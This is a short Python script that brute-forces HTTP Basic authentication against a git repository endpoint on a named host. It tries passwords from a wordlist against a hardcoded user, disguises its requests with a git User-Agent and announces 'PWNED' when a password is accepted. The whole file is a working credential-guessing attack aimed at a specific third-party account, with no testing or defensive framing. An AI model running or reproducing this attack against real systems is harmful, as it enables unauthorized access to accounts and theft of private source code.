import requests
import sys
import base64

TARGET = "http://g.orehus.club/softpigeones/m.srv.git/info/refs?service=git-upload-pack"
USER = "softpigeones"

def brute():
    with open("phantom/skunk_pass.txt", "r") as f:
        passwords = [line.strip() for line in f]

    print(f"[*] Attacking {TARGET} as {USER}")
    
    for pwd in passwords:
        creds = f"{USER}:{pwd}"
        b64_creds = base64.b64encode(creds.encode()).decode()
        headers = {
            "Authorization": f"Basic {b64_creds}",
            "User-Agent": "git/2.43.0"
        }
        
        try:
            r = requests.get(TARGET, headers=headers, timeout=5)
            if r.status_code == 200:
                print(f"\n\033[92m[+] PWNED! Password: {pwd}\033[0m")
                return
            elif r.status_code == 401:
                print(f"\r[-] Failed: {pwd}", end="")
            else:
                print(f"\r[!] Error {r.status_code}: {pwd}", end="")
        except Exception as e:
            print(f"\n[!] Ex: {e}")

    print("\n[*] Done.")

if __name__ == "__main__":
    brute()
